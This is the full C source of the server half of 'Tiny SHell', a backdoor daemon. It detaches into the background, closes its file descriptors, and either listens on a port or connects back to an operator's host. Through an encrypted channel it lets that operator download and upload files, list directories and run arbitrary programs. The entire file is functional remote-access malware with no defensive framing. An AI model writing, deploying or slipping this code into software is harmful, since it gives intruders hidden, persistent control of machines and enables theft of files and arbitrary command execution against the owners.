/*
 * Tiny SHell version 0.6 - server side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <dirent.h>
#include <sys/stat.h>

#include "tsh.h"

#include "pel.h"

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;

/* function declaration */

int process_client( int client );
int tshd_get_file( int client );
int tshd_put_file( int client );
int tshd_ls_dir( int client );
int tshd_execv( int client );

/* program entry point */


int main( )
{
    int ret, pid;
    socklen_t n;

    int client;
    struct sockaddr_in client_addr;


    /* fork into background */

    pid = fork();

    if( pid < 0 )
    {
        return( 1 );
    }

    if( pid != 0 )
    {
        return( 0 );
    }

    /* create a new session */

    if( setsid() < 0 )
    {
        perror("socket");
        return( 2 );
    }

    /* close all file descriptors */

    for( n = 0; n < 1024; n++ )
    {
        close( n );
    }


#ifndef CB_MODE // normal bind mode
    struct sockaddr_in server_addr;
    int server;
	if (cb_host == NULL) {
    	/* create a socket */

	    server = socket( AF_INET, SOCK_STREAM, 0 );

	    if( server < 0 )
	    {
	        perror("socket");
	        return( 3 );
	    }

	    /* bind the server on the port the client will connect to */    

	    n = 1;

	    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
                      (void *) &n, sizeof( n ) );

	    if( ret < 0 )
	    {
	        perror("setsockopt");
	        return( 4 );
	    }

	    server_addr.sin_family      = AF_INET;
	    server_addr.sin_port        = htons( server_port );
	    server_addr.sin_addr.s_addr = INADDR_ANY;

	    ret = bind( server, (struct sockaddr *) &server_addr,
                sizeof( server_addr ) );

	    if( ret < 0 )
	    {
	        perror("bind");
	        return( 5 );
	    }

	    if( listen( server, 5 ) < 0 )
	    {
	        perror("listen");
	        return( 6 );
	    }

	    while( 1 )
	    {
    	    /* wait for inboud connections */

        	n = sizeof( client_addr );

	        client = accept( server, (struct sockaddr *)
                         &client_addr, &n );

    	    if( client < 0 )
        	{
            	perror("accept");
	            return( 7 );
	        }

			ret = process_client(client);

			if (ret == 1) {
				continue;
			}

	        return( ret );
		}
	}
#else

		/* -c specfieid, connect back mode */

    struct hostent *client_host;
	    while( 1 )
	    {
	        sleep( CONNECT_BACK_DELAY );

	        /* create a socket */

	        client = socket( AF_INET, SOCK_STREAM, 0 );

	        if( client < 0 )
	        {
	            continue;
	        }

	        /* resolve the client hostname */

	        client_host = gethostbyname( cb_host );

	        if( client_host == NULL )
	        {
	            continue;
	        }

	        memcpy( (void *) &client_addr.sin_addr,
	                (void *) client_host->h_addr,
	                client_host->h_length );

	        client_addr.sin_family = AF_INET;
	        client_addr.sin_port   = htons( server_port );

	        /* try to connect back to the client */

	        ret = connect( client, (struct sockaddr *) &client_addr,
	                       sizeof( client_addr ) );

	        if( ret < 0 )
	        {
	            close( client );
	            continue;
	        }

	        ret = process_client(client);
			if (ret == 1) {
				continue;
			}

			return( ret );
	    }

#endif // CB_MODE  or not 
    

    /* not reached */

    return( 13 );
}

int process_client(int client) {

	int pid, ret, len;

    /* fork a child to handle the connection */

    pid = fork();

    if( pid < 0 )
    {
        close( client );
        return 1;
    }

    if( pid != 0 )
    {
        waitpid( pid, NULL, 0 );
        close( client );
    	return 1;
    }

    /* the child forks and then exits so that the grand-child's
     * father becomes init (this to avoid becoming a zombie) */

    pid = fork();

    if( pid < 0 )
    {
        return( 8 );
    }

    if( pid != 0 )
    {
    	return( 9 );
    }

    /* setup the packet encryption layer */

    alarm( 3 );

    ret = pel_server_init( client, secret );

    if( ret != PEL_SUCCESS )
    {
		shutdown( client, 2 );
    	return( 10 );
    }

    alarm( 0 );

    /* get the action requested by the client */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS || len != 1 )
    {
        shutdown( client, 2 );
        return( 11 );
    }

    /* howdy */

	switch( message[0] )
    {
        case GET_FILE:

            ret = tshd_get_file( client );
            break;

        case PUT_FILE:

            ret = tshd_put_file( client );
            break;

        case LS_DIR: /* LS_DIR */

            ret = tshd_ls_dir( client );
            break;

        case EXEC_BIN: /* EXEC_BIN */

            ret = tshd_execv( client );
            break;

        default:

                
        	ret = 12;
	    	break;
    }

    shutdown( client, 2 );
	return( ret );
}

int tshd_get_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 14 );
    }

    message[len] = '\0';

    /* open local file */

    fd = open( (char *) message, O_RDONLY );

    if( fd < 0 )
    {
        return( 15 );
    }

    /* send the data */

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len == 0 ) break;

        if( len < 0 )
        {
            return( 16 );
        }

        ret = pel_send_msg( client, message, len );

        if( ret != PEL_SUCCESS )
        {
            return( 17 );
        }
    }

    return( 18 );
}

int tshd_put_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 19 );
    }

    message[len] = '\0';

    /* create local file */

    fd = creat( (char *) message, 0644 );

    if( fd < 0 )
    {
        return( 20 );
    }

    /* fetch the data */

    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED )
            {
                break;
            }

            return( 21 );
        }

        if( write( fd, message, len ) != len )
        {
            return( 22 );
        }
    }

    return( 23 );
}

int tshd_ls_dir( int client )
{
    int ret, len;
    DIR *dir;
    struct dirent *entry;
    struct stat st;
    char path[BUFSIZE];
    char line[BUFSIZE + 256];

    /* get the directory path */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 56 );
    }

    message[len] = '\0';
    strncpy( path, (char *) message, BUFSIZE - 1 );
    path[BUFSIZE - 1] = '\0';

    /* open the directory */

    dir = opendir( path );

    if( dir == NULL )
    {
        return( 57 );
    }

    /* iterate through entries */

    while( ( entry = readdir( dir ) ) != NULL )
    {
        char full_path[BUFSIZE + 256];

        snprintf( full_path, sizeof(full_path), "%s/%s", path, entry->d_name );

        if( lstat( full_path, &st ) == 0 )
        {
            /* Format: mode owner group size name */
            snprintf( line, sizeof(line), "%06o %d %d %lld %s\n",
                     (unsigned int) st.st_mode, (int) st.st_uid, (int) st.st_gid,
                     (long long) st.st_size, entry->d_name );
        }
        else
        {
            snprintf( line, sizeof(line), "?????? ? ? ? %s\n", entry->d_name );
        }

        ret = pel_send_msg( client, (unsigned char *) line, strlen( line ) );

        if( ret != PEL_SUCCESS )
        {
            closedir( dir );
            return( 58 );
        }
    }

    closedir( dir );

    return( 59 );
    }

int tshd_execv( int client )
{
    int ret, len, pid, status;
    char *cmd, *argv[64];
    int i = 0;
    unsigned char exit_code;

    /* get the command line */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 60 );
    }

    message[len] = '\0';
    cmd = strdup( (char *) message );

    if( cmd == NULL )
    {
        return( 61 );
    }

    /* simple parsing: split by space */

    char *token = strtok( cmd, " " );
    while( token != NULL && i < 63 )
    {
        argv[i++] = token;
        token = strtok( NULL, " " );
    }
    argv[i] = NULL;

    if( i == 0 )
    {
        free( cmd );
        return( 62 );
    }

    pid = fork();

    if( pid < 0 )
    {
        free( cmd );
        return( 64 );
    }

    if( pid == 0 )
    {
        /* child */

        close( client );

        execv( argv[0], argv );

        /* if execv returns, an error occurred */
        exit( 1 );
    }
    else
    {
        /* parent */

        waitpid( pid, &status, 0 );
        free( cmd );

        if( WIFEXITED( status ) )
        {
            exit_code = (unsigned char) WEXITSTATUS( status );
        }
        else
        {
            exit_code = 255;
        }

        pel_send_msg( client, &exit_code, 1 );
    }

    return( 0 );
}